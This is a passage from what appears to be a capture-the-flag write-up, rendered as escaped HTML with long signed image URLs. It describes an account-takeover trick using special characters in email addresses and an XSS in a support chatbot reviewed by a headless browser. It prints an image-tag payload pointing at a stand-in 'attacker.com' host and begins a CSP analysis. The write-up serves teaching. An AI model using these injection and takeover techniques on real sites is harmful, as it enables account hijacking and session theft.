G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=f6aaa0ada73661891db263d8886e2f7b0b64aaf155c19e4ede7d996dc23caf8f\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hbA2eHZSegQ5GeMcodxhd7Et?response-content-disposition=attachment%3B%20filename%3D%22first-vuln.png%22%3B%20filename%2A%3DUTF-8%27%27first-vuln.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=f6aaa0ada73661891db263d8886e2f7b0b64aaf155c19e4ede7d996dc23caf8f\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"first-vulnerability-tldr\"\u003eFirst vulnerability - TLDR\u003c/h2\u003e\n\n\u003cp\u003e1) Our target account is \u003ccode\u003ejobert@mydocz.cosmic\u003c/code\u003e as hinted at on the login page.\u003cbr\u003e\n2) The \u003ccode\u003e/register\u003c/code\u003e API will allow special characters at the end of an email address. \u003cbr\u003e\n3) Most other API\u0026#39;s on this server silently remove any special characters from the input.  We can leverage this behaviour to register a variation on the target email like \u003ccode\u003ejobert@mydocz.cosmic\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026lt;\u0026lt;\u0026lt;\u003c/code\u003e\u003cbr\u003e\n4) After successfully registering, the \u0026quot;recovery\u0026quot; QR code can be used with the \u003ccode\u003e/recover\u003c/code\u003e API.  The special characters in the input email will be removed during the API processing, resulting in access to the \u003ccode\u003ejobert@mydocz.cosmic\u003c/code\u003e account.\u003c/p\u003e\n\n\u003ch2 id=\"second-vulnerability\"\u003eSecond vulnerability\u003c/h2\u003e\n\n\u003cp\u003eEven thought we now have access to Jobert\u0026#39;s account, there are no documents listed in this account on the \u003ccode\u003eDocuments\u003c/code\u003e page so it appears that more steps will be needed to complete this challenge.  Since everyone working on the CTF is sharing this server, making changes to Jobert\u0026#39;s account are disabled.  This includes uploading documents or changing profile details.  Not being able to access any of these functions helps narrow down where we should look for the next vulnerability.  Unlike any regular accounts that can be registered, Jobert\u0026#39;s account has access to the \u003ccode\u003e/support\u003c/code\u003e page.\u003c/p\u003e\n\n\u003cp\u003eOn the support page, a \u0026quot;chatbot\u0026quot; style interface loads.  Similar to real life customer service chatbots, this interface responds with random nonsense for every input that is given.  I immediately noticed that this support page is vulnerable to an XSS attack.  User input isn\u0026#39;t sanitized in any way, it\u0026#39;s just printed out to the page.  Even though self-XSS is great for bounty programs (just kidding...), it doesn\u0026#39;t immediately help us here.\u003c/p\u003e\n\n\u003cp\u003eEach message you input to the chatbot is passed as a \u003ccode\u003eGET\u003c/code\u003e request to the following API:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/support/chat?message=\u0026lt;input\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe server then responds with a JSON encoded message.  Testing did not show anything promising for the input being entered.  What \u003cem\u003ewas\u003c/em\u003e noticeable however was that a new cookie value is set after each call to this API, and the length of the cookie value named \u003ccode\u003esession\u003c/code\u003e would vary depending on both the user input \u003cem\u003eand\u003c/em\u003e the server output.\u003c/p\u003e\n\n\u003cp\u003eExamining the \u003ccode\u003esession\u003c/code\u003e cookie values showed that they appear to be \u003ccode\u003eBase64\u003c/code\u003e encoded, and they would always start with the same few characters: \u003ccode\u003eeJw9y0...\u003c/code\u003e.  This led to a fair amount of time unsuccessfully spent trying to decode/decrypt this cookie value.  It turns out that there is no need to actually gain access to this cookie parameter.\u003c/p\u003e\n\n\u003cp\u003eLooking for what I might be missing with the session token decryption I notice that there was a \u003cem\u003efairly obvious\u003c/em\u003e additional function in the chat bot.  The Javascript client side script for the support function is loaded from \u003ccode\u003e/js/support.min.js\u003c/code\u003e.  Reviewing this file shows the following line:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eif(\u0026quot;finish\u0026quot;!==t.toLowerCase()\u0026amp;\u0026amp;\u0026quot;quit\u0026quot;!==t.toLowerCase())\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTyping either of those words in as input to the chatbot displays a dialog for submitting feedback:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"sup3.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KwHgY3R5cSkeECFfR6r1LJ4q?response-content-disposition=attachment%3B%20filename%3D%22sup3.png%22%3B%20filename%2A%3DUTF-8%27%27sup3.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=e9b359f9888b668137fb700e95be04854fa7ab6e98606a40cdb3cca973de153e\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KwHgY3R5cSkeECFfR6r1LJ4q?response-content-disposition=attachment%3B%20filename%3D%22sup3.png%22%3B%20filename%2A%3DUTF-8%27%27sup3.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=e9b359f9888b668137fb700e95be04854fa7ab6e98606a40cdb3cca973de153e\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eClicking submit on this dialog causes a \u003ccode\u003ePOST\u003c/code\u003e request to be made to \u003ccode\u003e/support/feedback\u003c/code\u003e.  This request includes a parameter named \u003ccode\u003erating\u003c/code\u003e, and a CSRF token.  Further testing of the feedback API showed that if a rating of 2, 3, 4, or 5 stars was given, the server response would be:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThank you for your review!\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut if only 1 star was given as a rating (and passed to the feedback API), the response would instead be:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThank you for your review! Our team will review it shortly.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis clue gives away what we\u0026#39;ll need to do for our next vulnerability - we need to enter some sort of malicious input for the \u0026quot;support team\u0026quot; to review.  Since we know there\u0026#39;s a XSS vulnerability in the support page it seems like there\u0026#39;s a good chance it will affect the feedback review page too.  It also then makes sense why the \u003ccode\u003esession\u003c/code\u003e cookie value was being updated to include our user input: The feedback API will make use of our session cookie and load our chat session input from it.\u003c/p\u003e\n\n\u003cp\u003eTo confirm this vulnerability I entered an image tag as part of my support chat input, and set the path to an external server I controlled:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;img src=http://attacker.com/aaaaaa/\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI then called the feedback API giving my support session a 1 star rating.  Sure enough, on my external server I saw the request for the image come through:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"get.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/oxHoR6kj5zV1E7sSa5bsESSA?response-content-disposition=attachment%3B%20filename%3D%22get.png%22%3B%20filename%2A%3DUTF-8%27%27get.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=380ed72cdc4005077ae4ae6b47697a756cd49fdd1a8ffa5fa289f86c0571f4ba\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/oxHoR6kj5zV1E7sSa5bsESSA?response-content-disposition=attachment%3B%20filename%3D%22get.png%22%3B%20filename%2A%3DUTF-8%27%27get.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=380ed72cdc4005077ae4ae6b47697a756cd49fdd1a8ffa5fa289f86c0571f4ba\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis confirmed a HTML injection and potential XSS on the support page.  Getting a working XSS was the next step.\u003c/p\u003e\n\n\u003ch2 id=\"second-vulnerability-tldr\"\u003eSecond vulnerability - TLDR\u003c/h2\u003e\n\n\u003cp\u003e1) From Jobert\u0026#39;s account access the \u003ccode\u003e/support\u003c/code\u003e page.\u003cbr\u003e\n2) Leverage the HTML injection / XSS on the support page by passing in HTML tags to the support chat.  For example, use an image tag that references an external server.\u003cbr\u003e\n3) Type in \u003ccode\u003efinish\u003c/code\u003e or \u003ccode\u003equit\u003c/code\u003e to display the \u0026quot;Feedback\u0026quot; dialog. \u003cbr\u003e\n4) Mark your support session feedback as a 1 star rating to trigger the \u0026quot;support team\u0026quot; to \u0026quot;review\u0026quot; it.\u003cbr\u003e\n5) A copy of the input from the support chat will be rendered on the support agent\u0026#39;s browser, which turns out to just be a script running headless Chrome.  Our image tag will load, causing an external HTTP request to be made confirming this vulnerability path.\u003c/p\u003e\n\n\u003ch2 id=\"second-vulnerability-part-2\"\u003eSecond vulnerability - Part 2\u003c/h2\u003e\n\n\u003cp\u003eGetting the first part of this vulnerability working was actually fairly trivial except for the fact that I initially missed the feedback dialog option.  With the ability to cause arbitrary HTML content to sent to the \u0026quot;support team\u0026quot;, it seemed pretty clear that we would need to take over their session to gain additional privileges on the \u003ccode\u003eMy Docz\u003c/code\u003e system.  To take over a session though, we would almost certainly need Javascript execution.\u003c/p\u003e\n\n\u003cp\u003eBack at the support chat page, I noticed that while it appeared I had a XSS vulnerability, my browser wasn\u0026#39;t actually executing any Javascript payloads.  Instead, all Javascript was being blocked due to the server\u0026#39;s Content Security Policy (CSP).  Looking at the response headers, the following CSP rules are set by the server:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eContent-Security-Policy: default-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39; https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003edefault-src\u003c/code\u003e policy means that anything not otherwise listed will also be set to \u003ccode\u003eself\u003c/code\u003e.  In the world of CSP, \u003ccode\u003eself\u003c/code\u003e doesn\u0026#39;t mean \u0026quot;accept anything on the webpage\u0026quot;, it instead means \u0026quot;do not run any script content that is included directly on the page, only accept scripts hosted on this server\u0026quot;.  In other words, all the Javascript files hosted in under \u003ccode\u003ehttps://h1-415.h1ctf.com/\u003c/code\u003e could be loaded fine, but attempting to add our own Javascript content directly on the support chat page would fail.\u003c/p\u003e\n\n\u003cp\u003eThe one addition in the CSP apart from \u003ccode\u003eself\u003c/code\u003e is the \u003ccode\u003escript-src\u003c/code\u003e value of \u003ccode\u003ehttps://raw.githack.com/mattboldt/typed.js/master/lib/\u003c/code\u003e.  This seemed like an odd addition to the CSP rules since all other Javascript is referenced from scripts directly hosted on the challenge website.  Since the whole directory \u003ccode\u003e/mattboldt/typed.js/master/lib\u003c/code\u003e is allowed according to the CSP, I checked to see what other scripts could be referenced.  This turned out to be a dead end, nothing else of value was in the directory:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"typed.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LjbMxik3r7rrqda8jJ3Q8eL1?response-content-disposition=attachment%3B%20filename%3D%22typed.png%22%3B%20filename%2A%3DUTF-8%27%27typed.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=8b176cb7c09e7575dd52ed8f11f1550591483ece9654a266f8b44b39199c9a29\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LjbMxik3r7rrqda8jJ3Q8eL1?response-content-disposition=attachment%3B%20filename%3D%22typed.png%22%3B%20filename%2A%3DUTF-8%27%27typed.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7u